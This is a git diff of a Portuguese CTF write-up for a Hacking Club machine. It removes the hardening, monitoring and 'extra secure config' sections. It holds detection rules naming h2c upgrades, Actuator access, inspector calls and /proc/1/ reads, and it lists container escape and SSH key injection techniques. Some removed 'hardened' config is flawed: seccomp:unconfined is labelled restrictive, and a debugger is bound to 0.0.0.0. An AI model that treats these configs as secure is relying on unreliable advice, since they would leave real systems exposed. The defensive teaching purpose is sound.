-    user: "1000:1000"       # Roda como user normal, não root → evita syscalls perigosas
-
-    # Se o Node precisar escrever em /tmp, criamos um tmpfs volátil, não gravado em disco
-    tmpfs:
-      - /tmp
-
-    command: "node --inspect=0.0.0.0:8000 /app/server.js"
-
-    volumes:
-      - ./app:/app:ro       # Volume somente leitura → impede sobrescrita do código da aplicação
-
-    networks:
-      - app-network
-
-# ──────────────────────────────
-#    ISOLAMENTO DE REDE
-# ──────────────────────────────
-# Apenas serviços dentro dessa network podem se comunicar.
-# Nada é exposto externamente exceto o que o proxy expõe.
-# ──────────────────────────────
-networks:
-  app-network:
-    driver: bridge
-
-```
-
-**Dockerfile:**
-
-```dockerfile
-FROM node:18-alpine
-
-# Usuário não-privilegiado
-RUN addgroup -g 1001 -S nodejs
-RUN adduser -S nodejs -u 1001
-
-# Diretório de trabalho
-WORKDIR /app
-
-# Arquivos de aplicação
-COPY --chown=nodejs:nodejs . .
-RUN npm ci --only=production
-
-# Usuário final
-USER nodejs
-
-# Porta não-privilegiada
-EXPOSE 3000
-
-CMD ["node", "server.js"]
-```
-
-### 16.3 Monitoramento e detecção
-
-#### 16.3.1 Logs críticos para monitorar
-
-```text
-# Nginx - Tentativas de upgrade H2C
-"Upgrade: h2c" in access_log
-
-# Spring Boot - Acesso a Actuator
-/actuator/* endpoints
-
-# Docker - Montagem de filesystems  
-mount operations in container logs
-
-# Node.js - Debugging habilitado
-inspector.open() calls
-```
-
-#### 16.3.2 Alertas recomendados
-
-- Conexões WebSocket para endpoints administrativos
-- Execução de comandos via child_process  
-- Tentativas de mount dentro de containers
-- Acessos a arquivos sensíveis (`/proc/1/`, `/.dockerenv`)
-
-### 16.4 Conclusão técnica
-
-Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades se combinam:
-
-- **Misconfiguration** do proxy reverso  
-- **Exposição de endpoints administrativos**
-- **Debugging habilitado em produção**
-- **Container com privilégios excessivos**
-
-**Cada vulnerabilidade individualmente já fica ruim, elas combinadas resultaram em comprometimento total do ambiente.**
-
-**Lições aprendidas:**
-
-1. **Defense in Depth** - Múltiplas camadas de segurança são essenciais
-2. **Least Privilege** - Containers nunca devem ser privilegiados em produção  
-3. **Security by Design** - Endpoints de debugging/admin devem ser isolados
-4. **Configuration Management** - Proxies devem validar rigorosamente protocolos
-
-**Impacto final:** Comprometimento completo da infraestrutura através de uma cadeia de exploração bem executada.
+Mas como todas estavam presentes, criaram um caminho direto para comprometimento total. É um ótimo lembrete de que segurança não é sobre uma configuração perfeita, mas sobre várias camadas que se protegem mutuamente.
 
 ---
 
@@ -1304,14 +1249,15 @@ Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades
 - Privileged Container Escape / Container Breakout via Host Filesystem Mount / Rootfs Access
 - SSH Authorized Keys Injection / SSH Key Injection Persistence / Privilege Escalation & Host Persistence
 
-**Referências Principais**
- - [Hacktricks](https://book.hacktricks.wiki/pt/index.html)
- - [BishopFox](https://bishopfox.com/)
- - [Crowsec](https://blog.crowsec.com.br/)
- - [Chrome DevTools](https://chromedevtools.github.io/)
- - [Hacking Club](https://app.hackingclub.com/training/training-machines/176)
+### Referências Principais
 
-**Referências Adicionais**
+- [Hacktricks](https://book.hacktricks.wiki/pt/index.html)
+- [BishopFox](https://bishopfox.com/)
+- [Crowsec](https://blog.crowsec.com.br/)
+- [Chrome DevTools](https://chromedevtools.github.io/)
+- [Hacking Club](https://app.hackingclub.com/training/training-machines/176)
+
+### Referências Adicionais
 
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [Docker Security Best Practices](https://docs.docker.com/engine/security/)
@@ -1322,751 +1268,4 @@ Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades
 
 <img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />
 
-###### Nota: Mantive apenas visivel em foto uma flag (primeira), não tenho intenção de dar cola.
-
-### 17 [EXTRA] Códigos/Configurações mais seguros(as)/robustos(as)
-  
-  Em mitigação mostramos formas de deixar as configurações e códigos da aplicação atual mais seguras. Porém, ainda elas não estão necessariamente 100% confiáveis, entretando já ajuda a mitigar as falhas da forma como exploramos.
-  Segue os arquivos ainda mais robustos:
-
- - Aviso: Essa seção EXTRA foi feita com auxílio de IA e não foi revisada em sua totalidade
-
-#### 17.1 - A) Spring Boot
-
-```yaml
-# application-production.yml - Configuração robusta para produção
-server:
-  port: 8080
-  address: 0.0.0.0
-  
-  # Desabilita HTTP/2 completamente (evita h2c smuggling)
-  http2:
-    enabled: false
-  
-  # Configurações de segurança do servidor
-  ssl:
-    enabled: true  # HTTPS obrigatório em produção
-  
-  # Timeouts para evitar DoS
-  connection-timeout: 20s
-  
-spring:
-  profiles:
-    active: production
-  
-  # Desabilita banner e informações desnecessárias
-  main:
-    banner-mode: off
-  
-  # Configuração de logging segura
-  logging:
-    level:
-      org.springframework.web: WARN
-      org.springframework.security: WARN
-    pattern:
-      console: "%d{HH:mm:ss.SSS} [%thread] %-5level - %msg%n"
-
-# Configuração robusta do Actuator
-management:
-  endpoints:
-    web:
-      exposure:
-        include: "health"  # Apenas health endpoint
-      base-path: "/internal/monitoring"  # Caminho não-óbvio
-      
-    # Desabilita todos os endpoints JMX
-    jmx:
-      exposure:
-        exclude: "*"
-  
-  endpoint:
-    health:
-      show-details: never  # Nunca mostrar detalhes internos
-      show-components: never
-      
-  # Servidor de management em porta separada e localhost apenas
-  server:
-    port: 9090
-    address: 127.0.0.1  # Apenas localhost
-    
-  # Métricas desabilitadas (evita vazamento de informações)
-  metrics:
-    enabled: false
-
-# Configurações de segurança adicionais
-security:
-  headers:
-    frame: true  # X-Frame-Options
-    content-type: true  # X-Content-Type-Options
-    xss: true  # X-XSS-Protection
-```
-
- - Desabilitação de HTTP/2, HTTPS obrigatório
- - Actuator em porta separada (localhost apenas)
- - Logging seguro, timeouts, métricas desabilitadas
-
-#### 17.2 - B) Node.js
-
-```javascript
-// server-secure.js - Servidor Node.js com configurações robustas
-const http = require('http');
-const url = require('url');
-const crypto = require('crypto');
-
-class SecureNodeServer {
-  constructor() {
-    this.debugEnabled = false;
-    this.validateEnvironment();
-    this.setupSecurity();
-  }
-
-  validateEnvironment() {
-    // Múltiplas verificações para habilitar debug
-    const env = process.env.NODE_ENV;
-    const debugFlag = process.env.DEBUG_MODE;
-    const allowedHosts = ['localhost', '127.0.0.1'];
-    const hostname = require('os').hostname();
-
-    // Debug apenas em desenvolvimento local
-    if (env === 'development' && 
-        debugFlag === 'true' && 
-        allowedHosts.includes(hostname)) {
-      
-      console.warn('[SECURITY] Debug mode enabled - DEV ONLY');
-      this.enableDebug();
-    } else {
-      console.info('[SECURITY] Debug disabled for security');
-    }
-  }
-
-  enableDebug() {
-    try {
-      // Bind apenas para localhost, porta alta
-      require('inspector').open(9229, '127.0.0.1', false);
-      this.debugEnabled = true;
-    } catch (error) {
-      console.error('[ERROR] Failed to enable debug:', error.message);
-    }
-  }
-
-  setupSecurity() {
-    // Remove headers perigosos
-    process.on('uncaughtException', (error) => {
-      console.error('[FATAL] Uncaught exception:', error);
-      process.exit(1);
-    });
-
-    // Timeout para requests
-    this.requestTimeout = 30000; // 30 segundos
-
-    // Rate limiting simples
-    this.rateLimiter = new Map();
-  }
-
-  validateRequest(req) {
-    const clientIP = req.connection.remoteAddress;
-    const now = Date.now();
-    
-    // Rate limiting: máximo 10 requests por minuto por IP
-    if (!this.rateLimiter.has(clientIP)) {
-      this.rateLimiter.set(clientIP, []);
-    }
-    
-    const requests = this.rateLimiter.get(clientIP);
-    const recentRequests = requests.filter(time => now - time < 60000);
-    
-    if (recentRequests.length >= 10) {
-      return { valid: false, reason: 'Rate limit exceeded' };
-    }
-    
-    recentRequests.push(now);
-    this.rateLimiter.set(clientIP, recentRequests);
-    
-    return { valid: true };
-  }
-
-  createServer() {
-    return http.createServer((req, res) => {
-      // Timeout para cada request
-      req.setTimeout(this.requestTimeout, () => {
-        res.writeHead(408, { 'Content-Type': 'text/plain' });
-        res.end('Request Timeout');
-      });
-
-      // Validação de request
-      const validation = this.validateRequest(req);
-      if (!validation.valid) {
-        res.writeHead(429, { 'Content-Type': 'text/plain' });
-        res.end('Too Many Requests');
-        return;
-      }
-
-      // Headers de segurança
-      res.setHeader('X-Frame-Options', 'DENY');
-      res.setHeader('X-Content-Type-Options', 'nosniff');
-      res.setHeader('X-XSS-Protection', '1; mode=block');
-      
-      // Processar request de forma segura
-      this.handleRequest(req, res);
-    });
-  }
-
-  handleRequest(req, res) {
-    const parsedUrl = url.parse(req.url);
-    
-    // Apenas métodos seguros
-    if (!['GET', 'POST'].includes(req.method)) {
-      res.writeHead(405, { 'Content-Type': 'text/plain' });
-      res.end('Method Not Allowed');
-      return;
-    }
-
-    // Log de acesso (sem informações sensíveis)
-    const timestamp = new Date().toISOString();
-    const clientIP = req.connection.remoteAddress;
-    console.log(`[${timestamp}] ${req.method} ${parsedUrl.pathname} - ${clientIP}`);
-
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ 
-      status: 'secure',
-      timestamp: timestamp,
-      debug: this.debugEnabled 
-    }));
-  }
-
-  start(port = 8000) {
-    const server = this.createServer();
-    
-    server.listen(port, '0.0.0.0', () => {
-      console.log(`[INFO] Secure server running on port ${port}`);
-      console.log(`[INFO] Debug mode: ${this.debugEnabled ? 'ENABLED' : 'DISABLED'}`);
-    });
-
-    // Graceful shutdown
-    process.on('SIGTERM', () => {
-      console.log('[INFO] SIGTERM received, shutting down gracefully');
-      server.close(() => {
-        console.log('[INFO] Server closed');
-        process.exit(0);
-      });
-    });
-  }
-}
-
-// Inicialização segura
-if (require.main === module) {
-  const server = new SecureNodeServer();
-  server.start();
-}
-
-module.exports = SecureNodeServer;
-```
-
- - Classe SecureNodeServer com validação de ambiente
- - Rate limiting, headers de segurança
- - Graceful shutdown, debug apenas em desenvolvimento
-
-#### 17.3 - C) Docker Compose (Cfg-Produção)
-
-```yaml
-# docker-compose.production.yml - Configuração robusta para produção
-version: "3.8"
-
-services:
-  # ================================
-  # BACKEND SPRING BOOT (SEGURO)
-  # ================================
-  backend:
-    build:
-      context: ./backend
-      dockerfile: Dockerfile.production
-      args:
-        - BUILD_DATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ')
-        - VCS_REF=$(git rev-parse --short HEAD)
-    
-    restart: unless-stopped
-    
-    environment:
-      - SPRING_PROFILES_ACTIVE=production
-      - JAVA_OPTS=-Xmx512m -Xms256m -XX:+UseG1GC
-      - SPRING_DATASOURCE_URL=jdbc:postgresql://db:5432/appdb
-      - SPRING_DATASOURCE_USERNAME=appuser
-      - SPRING_DATASOURCE_PASSWORD_FILE=/run/secrets/db_password
-      
-    # ================================
-    # HARDENING DE SEGURANÇA
-    # ================================
-    security_opt:
-      - no-new-privileges:true     # Impede escalação de privilégios
-      - seccomp:unconfined         # Profile de syscalls restritivo
-    
-    cap_drop:
-      - ALL                        # Remove TODAS as capabilities
-    cap_add:
-      - SETUID                     # Apenas para mudança de usuário
-      - SETGID                     # Apenas para mudança de grupo
-    
-    read_only: true                # Sistema de arquivos somente leitura
-    
-    tmpfs:
-      - /tmp:rw,noexec,nosuid,nodev,size=100m  # Temp directory seguro
-      - /var/log:rw,noexec,nosuid,nodev,size=50m
-    
-    volumes:
-      - ./backend/logs:/app/logs:rw  # Logs em volume específico
-    
-    user: "1001:1001"              # Usuário não-root específico
-    
-    # ================================
-    # RECURSOS E LIMITES
-    # ================================
-    deploy:
-      resources:
-        limits:
-          cpus: "1.0"              # Máximo 1 CPU
-          memory: 512M             # Máximo 512MB RAM
-        reservations:
-          cpus: "0.25"             # Reserva mínima
-          memory: 256M
-    
-    # ================================
-    # REDE ISOLADA
-    # ================================
-    networks:
-      - backend-network
-    
-    # ================================
-    # HEALTHCHECK
-    # ================================
-    healthcheck:
-      test: ["CMD", "curl", "-f", "http://localhost:8080/internal/monitoring/health"]
-      interval: 30s
-      timeout: 10s
-      retries: 3
-      start_period: 60s
-    
-    secrets:
-      - db_password
-
-  # ================================
-  # PROXY NGINX (SEGURO)
-  # ================================
-  proxy:
-    build:
-      context: ./proxy
-      dockerfile: Dockerfile.production
-    
-    restart: unless-stopped
-    
-    ports:
-      - "443:443"                  # HTTPS apenas
-      - "80:80"                    # Redirect para HTTPS
-    
-    environment:
-      - NGINX_WORKER_PROCESSES=auto
-      - NGINX_WORKER_CONNECTIONS=1024
-    
-    # ================================
-    # HARDENING DE SEGURANÇA
-    # ================================
-    security_opt:
-      - no-new-privileges:true
-    
-    cap_drop:
-      - ALL
-    cap_add:
-      - NET_BIND_SERVICE          # Para bind em portas 80/443
-      - CHOWN                     # Para gerenciar certificados
-    
-    read_only: true
-    
-    tmpfs:
-      - /var/cache/nginx:rw,noexec,nosuid,nodev,size=50m
-      - /var/run:rw,noexec,nosuid,nodev,size=10m
-    
-    volumes:
-      - ./proxy/nginx.conf:/etc/nginx/nginx.conf:ro
-      - ./proxy/ssl:/etc/ssl/certs:ro  # Certificados SSL
-      - ./proxy/logs:/var/log/nginx:rw
-    
-    user: "1002:1002"
-    
-    deploy:
-      resources:
-        limits:
-          cpus: "0.5"
-          memory: 128M
-        reservations:
-          cpus: "0.1"
-          memory: 64M
-    
-    networks:
-      - frontend-network
-      - backend-network
-    
-    depends_on:
-      backend:
-        condition: service_healthy
-
-  # ================================
-  # BANCO DE DADOS (SEGURO)
-  # ================================
-  db:
-    image: postgres:15-alpine
-    
-    restart: unless-stopped
-    
-    environment:
-      - POSTGRES_DB=appdb
-      - POSTGRES_USER=appuser
-      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
-      - POSTGRES_INITDB_ARGS=--auth-host=scram-sha-256
-    
-    security_opt:
-      - no-new-privileges:true
-    
-    cap_drop:
-      - ALL
-    cap_add:
-      - SETUID
-      - SETGID
-      - DAC_OVERRIDE
-    
-    read_only: true
-    
-    tmpfs:
-      - /tmp:rw,noexec,nosuid,nodev,size=100m
-      - /run:rw,noexec,nosuid,nodev,size=10m
-    
-    volumes:
-      - postgres_data:/var/lib/postgresql/data
-      - ./db/init:/docker-entrypoint-initdb.d:ro
-    
-    user: "999:999"  # postgres user
-    
-    deploy:
-      resources:
-        limits:
-          cpus: "1.0"
-          memory: 512M
-        reservations:
-          cpus: "0.25"
-          memory: 256M
-    
-    networks:
-      - backend-network
-    
-    healthcheck:
-      test: ["CMD-SHELL", "pg_isready -U appuser -d appdb"]
-      interval: 30s
-      timeout: 10s
-      retries: 5
-    
-    secrets:
-      - db_password
-
-# ================================
-# REDES ISOLADAS
-# ================================
-networks:
-  frontend-network:
-    driver: bridge
-    driver_opts:
-      com.docker.network.bridge.name: "frontend-br"
-    ipam:
-      driver: default
-      config:
-        - subnet: 172.20.1.0/24
-  
-  backend-network:
-    driver: bridge
-    driver_opts:
-      com.docker.network.bridge.name: "backend-br"
-    internal: true  # Sem acesso à internet
-    ipam:
-      driver: default
-      config:
-        - subnet: 172.20.2.0/24
-
-# ================================
-# VOLUMES PERSISTENTES
-# ================================
-volumes:
-  postgres_data:
-    driver: local
-    driver_opts:
-      type: none
-      o: bind
-      device: ./data/postgres
-
-# ================================
-# SECRETS (DOCKER SWARM)
-# ================================
-secrets:
-  db_password:
-    file: ./secrets/db_password.txt
-```
-
- - Hardening completo (no-new-privileges, capabilities mínimas)
- - Redes isoladas, healthchecks, secrets
- - Filesystem read-only, usuários não-root
-
-#### 17.4 - D) Dockerfile de Produção (Multistage Build)
-
-```dockerfile
-# Dockerfile.production - Build multistage para Spring Boot
-# ================================
-# STAGE 1: BUILD
-# ================================
-FROM eclipse-temurin:17-jdk-alpine AS builder
-
-# Usuário para build (não-root)
-RUN addgroup -g 1001 -S builder && \
-    adduser -S builder -u 1001 -G builder
-
-USER builder
-WORKDIR /app
-
-# Copy apenas arquivos necessários para build
-COPY --chown=builder:builder pom.xml ./
-COPY --chown=builder:builder src ./src/
-
-# Build da aplicação
-RUN ./mvnw clean package -DskipTests && \
-    mv target/*.jar app.jar
-
-# ================================
-# STAGE 2: RUNTIME SEGURO
-# ================================
-FROM eclipse-temurin:17-jre-alpine AS runtime
-
-# Instalar apenas pacotes essenciais
-RUN apk add --no-cache \
-    curl \
-    tzdata && \
-    rm -rf /var/cache/apk/*
-
-# Criar usuário específico para aplicação
-RUN addgroup -g 1001 -S appgroup && \
-    adduser -S appuser -u 1001 -G appgroup
-
-# Estrutura de diretórios
-RUN mkdir -p /app/logs && \
-    mkdir -p /app/temp && \
-    chown -R appuser:appgroup /app
-
-# Copy da aplicação do stage anterior
-COPY --from=builder --chown=appuser:appgroup /app/app.jar /app/app.jar
-
-# Copy de arquivos de configuração
-COPY --chown=appuser:appgroup application-production.yml /app/
-COPY --chown=appuser:appgroup logback-spring.xml /app/
-
-USER appuser
-WORKDIR /app
-
-# Configurações JVM otimizadas e seguras
-ENV JAVA_OPTS="-Xmx512m -Xms256m \
-               -XX:+UseG1GC \
-               -XX:+UseStringDeduplication \
-               -XX:+DisableExplicitGC \
-               -Djava.security.egd=file:/dev/./urandom \
-               -Dspring.profiles.active=production \
-               -Djava.awt.headless=true"
-
-# Porta não-privilegiada
-EXPOSE 8080
-
-# Health check interno
-HEALTHCHECK --interval=30s --timeout=10s --start-period=60s --retries=3 \
-    CMD curl -f http://localhost:8080/internal/monitoring/health || exit 1
-
-# Entrypoint seguro
-ENTRYPOINT ["java"] 
-CMD ["-jar", "/app/app.jar"]
-```
-
- - Build em estágios separados
- - JVM otimizada, healthcheck interno
- - Usuário específico, configurações de segurança
-
-#### 17.5 - E) Nginx (cfg)
-```nginx
-# nginx.conf (trecho para incluir no bloco 'http { ... }' ou como arquivo único)
-# ------------------------------------------------------------
-# CONTEXTO http: variáveis, maps e regras globais para mitigações
-# ------------------------------------------------------------
-
-# Map para normalizar valor de Connection quando o Upgrade for websocket.
-# Isso evita problemas onde múltiplos valores ou variações causam comportamento ambíguo.
-# Usamos esse map para só permitir "Upgrade" quando for realmente websocket.
-map $http_upgrade $connection_upgrade {
-    default "";
-    ~*websocket  "Upgrade";
-}
-
-# Limite de taxa global (ex.: 10 req/seg por IP com burst)
-# Protege contra brute force / abuse em endpoints públicos.
-limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
-
-# Desativa underscores em headers para reduzir confusão entre header names.
-# Alguns atacantes usam underscores para manipular roteadores/proxies.
-underscores_in_headers off;
-
-# Ignora headers inválidos (ajuda contra request smuggling por headers malformados).
-# Quando on, Nginx rejeita headers que não seguem o formato 'Name: value'.
-ignore_invalid_headers on;
-
-# Ajustes de buffers para mitigar headers muito grandes (evita header injection / DoS)
-large_client_header_buffers 4 16k;
-
-# Proteção contra request body muito grande (mitiga upload malicioso / RCE por payloads)
-client_max_body_size 1M;        # ajustar conforme necessidade da sua app
-client_body_timeout 10s;
-
-# Timeout para leitura/escrita no cliente
-send_timeout 10s;
-keepalive_timeout 15s;
-
-# Configurações padrão de proxy que aplicaremos globalmente.
-# NOTA: aqui limpamos Upgrade/Connection por padrão (evita proxies que herdam header perigoso).
-proxy_set_header Upgrade "";
-proxy_set_header Connection "";
-proxy_http_version 1.1;        # necessário para WebSocket; mas cuidado: controlamos onde habilitar Upgrade
-proxy_set_header Host $host;
-proxy_set_header X-Real-IP $remote_addr;
-proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-
-# Cabeçalhos de segurança básicos que vale sempre incluir (ajuste conforme sua aplicação)
-# HSTS só deve ser ativado em produção com HTTPS — aqui exemplifico.
-add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
-add_header X-Frame-Options "DENY" always;
-add_header X-Content-Type-Options "nosniff" always;
-add_header Referrer-Policy "no-referrer-when-downgrade" always;
-# CSP minimal — ajuste concreto conforme os recursos da sua app
-add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none';" always;
-
-
-# ------------------------------------------------------------
-# BLOCO DO SERVIDOR (substituir o server atual)
-# ------------------------------------------------------------
-server {
-    listen       80 default_server;
-    server_name  localhost;
-
-    # --------------------------
-    #  Proteção global contra H2C
-    #  - Rejeita explicitamente qualquer tentativa de Upgrade para h2c
-    #  - Deve ficar aqui, no topo do server, aplicado antes dos locations
-    # --------------------------
-    if ($http_upgrade ~* "h2c") {
-        # Retorna 400 Bad Request para tentativas de upgrade para HTTP/2 cleartext
-        # (mitiga H2C bypass / cleartext upgrade exploits).
-        return 400;
-    }
-
-    # --------------------------
-    #  Proteções contra request smuggling (CL / TE)
-    #  - Forçamos comportamento consistente: Nginx já gerencia CL/TE, mas:
-    #    * ignore_invalid_headers on (acima) ajuda a rejeitar headers malformados
-    #    * não repassamos Transfer-Encoding nem TE por padrão
-    # --------------------------
-    proxy_set_header Transfer-Encoding "";   # evita que Transfer-Encoding seja repassado
-    proxy_set_header TE "";                  # remove TE header se existir
-
-    # --------------------------
-    #  endpoint público principal -> backend Spring
-    # --------------------------
-    location / {
-        # Proteção de rate limit aplicada (evita abuso em endpoint root)
-        limit_req zone=one burst=20 nodelay;
-
-        # Proxy para o serviço backend (nome do serviço docker-compose)
-        proxy_pass http://backend:8080;
-
-        # Forçamos HTTP/1.1 para permitir keepalive entre proxy e backend
-        proxy_http_version 1.1;
-
-        # NÃO repassar Upgrade/Connection por padrão (evitamos upgrades indesejados)
-        # Usamos as variáveis normalizadas declaradas no topo.
-        proxy_set_header Upgrade "";               # bloqueado por default
-        proxy_set_header Connection "";            # bloqueado por default
-
-        # Timeouts e buffers do proxy (mitigam slowloris e proxied DoS)
-        proxy_read_timeout 30s;
-        proxy_send_timeout 30s;
-        proxy_buffering on;
-        proxy_buffers 8 16k;
-        proxy_busy_buffers_size 32k;
-
-        # Tamanhos máximos para evitar uploads grandes não autorizados
-        client_max_body_size 1M;
-    }
-
-    # --------------------------
-    #  Bloqueio do endpoint /actuator (não acessível externamente)
-    #  - Ideal: deixar esse endpoint apenas na loopback ou na network docker interna
-    # --------------------------
-    location /actuator {
-        # Rejeita todo acesso externo
-        deny all;
-        # Se quiser permitir logs internos, use allow 127.0.0.1; deny all;
-    }
-
-    # --------------------------
-    #  Rota WebSocket / endpoint de debug interno
-    #  Este location habilita Upgrade apenas AQUI e de forma controlada.
-    #  Regras:
-    #   - só habilitamos Upgrade para 'websocket' (map + connection_upgrade)
-    #   - sanitizamos headers
-    #   - rate limit mais restritivo
-    # --------------------------
-    location /admin/internal-web-socket-endpoint/ {
-        # Rate limit mais restrito (ex: 5 req/s)
-        limit_req zone=one burst=10 nodelay;
-
-        # Proxy para o service 'internal' que roda o websocket/debug
-        proxy_pass http://internal:8000/;
-        proxy_http_version 1.1;
-
-        # Permite Upgrade somente se $http_upgrade indicar websocket (map definido em http{})
-        # Isso evita aceitar h2c ou outras tentativas de upgrade forçadas.
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection $connection_upgrade;
-
-        # Headers úteis
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Real-IP $remote_addr;
-
-        # Timeouts para sockets (ajuste conforme necessidade)
-        proxy_read_timeout 120s;
-        proxy_send_timeout 120s;
-
-        # Limita o tamanho de headers e body para esse endpoint sensível
-        client_max_body_size 256k;
-
-        # Proteções adicionais: não permitir buffer excessivo
-        proxy_buffering off;
-    }
-
-    # --------------------------
-    #  Erros e páginas (manter simples)
-    # --------------------------
-    error_page 400 401 403 404 500 502 503 504 /50x.html;
-    location = /50x.html {
-        root /usr/share/nginx/html;
-    }
-}
-
-# ------------------------------------------------------------
-# FIM do arquivo
-# ------------------------------------------------------------
-```
-
- - Proteção contra H2C smuggling (if ($http_upgrade ~* "h2c"))
- - Rate limiting global e por endpoint
- - Headers de segurança (HSTS, CSP, X-Frame-Options)
- - Validação rigorosa de protocolos e upgrades
- - Timeouts e buffers configurados
- - WebSocket controlado apenas onde necessário
+**Nota: Mantive apenas visivel em foto uma flag (primeira) para te fazer praticar. Em vídeo temos resolução do exercício com as flags, mas ainda é preferível que faça você mesmo, nunca esquecer. Assistir é algo passivo, em hacking só aprendemos mesmo quanto somos ativo.**
